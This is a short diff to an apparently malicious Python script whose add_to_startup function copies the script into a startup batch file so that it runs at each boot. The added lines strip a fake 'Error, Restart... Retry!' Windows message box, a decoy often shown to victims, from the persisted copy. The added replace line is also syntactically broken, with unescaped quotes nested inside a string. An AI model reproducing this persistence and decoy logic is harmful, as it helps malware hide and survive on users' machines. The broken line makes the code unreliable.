@@ -55,6 +55,10 @@ def add_to_startup(py_file_path=file_path, bat_file_path=None):
     contents = contents.replace("add_to_startup()", "")
     with open(bat_file_path, "w", encoding="utf-8") as f:
         f.write(contents)
+    contents = contents.replace("ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)", "pass")
+
+    with open(bat_file_path, "w", encoding="utf-8") as f:
+        f.write(contents)
 
 add_to_startup()
 
